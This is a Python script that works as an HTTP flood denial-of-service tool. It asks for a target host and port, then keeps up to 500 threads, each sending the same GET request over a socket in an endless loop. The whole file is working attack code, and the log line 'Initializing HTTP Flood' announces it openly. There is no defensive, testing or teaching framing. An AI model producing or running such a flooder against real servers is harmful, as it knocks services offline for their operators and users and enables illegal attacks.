import logging
import threading
import socket
import time
import sys

try:
	host = input("HOST: ")
	while True:
		try:
			port = int(input("PORT: "))
			break
		except ValueError:
			print("Invalid port value.")
			pass
except KeyboardInterrupt:
	sys.exit()
active_threads = 0
max_threads = 500

if "d" in sys.argv or "debug" in sys.argv:
	logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%Y-%m-%d %H:%M:%S", level=logging.DEBUG)
else:
	logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%Y-%m-%d %H:%M:%S", level=logging.INFO)

def HTTP(host, port):
	try:
		global active_threads
		active_threads += 1
		http = f"GET / HTTP/1.1\r\nHost:{host}\r\n\r\n"
		sock = socket.socket()
		sock.connect((host, port))
		while True:
			sock.send(http.encode())
	except Exception as e:
		logging.debug(f"HTTP Error: {e}")
		pass
	finally:
		active_threads -= 1

def verbose():
	while True:
		time.sleep(3)
		logging.info(f"Active Threads: {active_threads}")

logging.info(f"Initializing HTTP Flood with {max_threads} threads...")
threading.Thread(target=verbose, daemon=True).start()
while True:
	try:
		if active_threads >= max_threads:
			continue
		threading.Thread(target=HTTP, args=[host, port], daemon=True).start()
	except Exception as e:
		logging.debug(f"Main Error: {e}")
		pass
	except KeyboardInterrupt:
		sys.exit()
